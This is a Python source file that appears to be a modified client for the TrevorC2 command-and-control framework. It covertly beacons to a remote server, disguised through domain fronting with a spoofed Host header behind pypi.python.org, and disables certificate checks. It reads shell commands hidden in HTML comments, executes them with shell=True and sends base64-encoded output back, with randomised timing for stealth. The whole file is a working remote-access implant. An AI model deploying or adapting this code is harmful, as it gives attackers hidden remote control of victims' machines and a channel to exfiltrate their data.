#!/usr/bin/env python
#
# CONFIG CONSTANTS:

# site used to communicate with (remote TrevorC2 site)
SITE_URL = ("https://pypi.python.org")

# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
ROOT_PATH_QUERY = ("/")

# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
SITE_PATH_QUERY = ("/images")

# THIS IS THE QUERY STRING PARAMETER USED
QUERY_STRING = ("guid=")

# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
STUB = ("oldcss=")

# time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
time_interval1 = 2
time_interval2 = 8

HOST_HEADER = ("psec.forward.io.global.prod.fastly.net")

# Dont live forever
import datetime
minutes_from_now = 5
minutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)

def not_yet_expired():
    return datetime.datetime.now() <= minutes_until_expiry
# DO NOT CHANGE BELOW THIS LINE
HOST_ALIVE = True
from urllib import request
import ssl
import random
import base64
import time
import subprocess
import hashlib
import sys
import platform
import json

class Request:
    def __init__(self):
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.cookie_processor = request.HTTPCookieProcessor()

    def get(self, url):
        try:
            r = request.Request(url, headers = {'Host': HOST_HEADER})
            #r.add_header('cookie', self.cookie)
            opener = request.build_opener(self.cookie_processor)
            res = opener.open(r, timeout = 5)
            return res.read()
        except:
            HOST_ALIVE = False
            return "dead"

    def post(self, url, data):
        try:
            data = json.dumps({"output": data})
            encoded = base64.urlsafe_b64encode(data.encode("utf-8"))
            r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})
            opener = request.build_opener(self.cookie_processor)
            res = opener.open(r, timeout = 5)
            return res.read()
        except:
            HOST_ALIVE = False
            return "dead"

# python 2/3 compatibility, need to move this to python-requests in future

# random interval for communication
def random_interval(time_interval1, time_interval2):
    return random.randint(time_interval1, time_interval2)

hostname = platform.node()
#req = requests.session()
req = Request()

def connect_trevor():
    # we need to registery our asset first
    while not_yet_expired() and HOST_ALIVE:
        time.sleep(1)
        try:
            hostname_send  = ("magic_hostname=" + hostname).encode('utf-8')
            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))

            # pipe out stdout and base64 encode it then request via a query string parameter
            #html = req.get(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'}).text
            html = req.get(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send)
            print(html)
            break

        # handle exceptions and pass if the server is unavailable, but keep going
        except Exception as error:
            # if we can't communicate, just pass
            if "Connection refused" in str(error):
                print(str(error))
                pass
            else:
                print("[!] Something went wrong in connecting, printing error: " + str(error))

connect_trevor()

# main call back here
while not_yet_expired() and HOST_ALIVE:
    try:
        time.sleep(random_interval(time_interval1, time_interval2))
        # request with specific user agent
        html = req.get(SITE_URL + ROOT_PATH_QUERY)
        if html == "dead": HOST_ALIVE = False

        # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
        parse = html.decode().split("<!-- %s" % (STUB))[1].split("-->")[0]

        parse = parse.replace("'", "")
        parse = parse.replace('"', "")
        if parse == "nothing": pass
        else:
            if hostname in parse:
                parse = parse.split(hostname + "::::")[1]
                # execute our parsed command
                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout_value = proc.communicate()[0]
                stdout_value = (hostname + "::::" + str(stdout_value)).encode('utf-8')
                stdout_value = base64.b64encode(stdout_value).decode('utf-8')

                # pipe out stdout and base64 encode it then request via a query string parameter
                #html = req.get(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value)
                html = req.post(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING, data = stdout_value)

                # sleep random interval and let cleanup on server side
                time.sleep(random_interval(time_interval1, time_interval2))

    # handle exceptions and pass if the server is unavailable, but keep going
    except Exception as error:
        # if we can't communicate, just pass
        if "Connection refused" in str(error):
            connect_trevor()
        else:
            print("[!] Something went wrong in polling, printing error: " + str(error))

    except KeyboardInterrupt:
        print ("\n[!] Exiting TrevorC2 Client...")
        sys.exit()

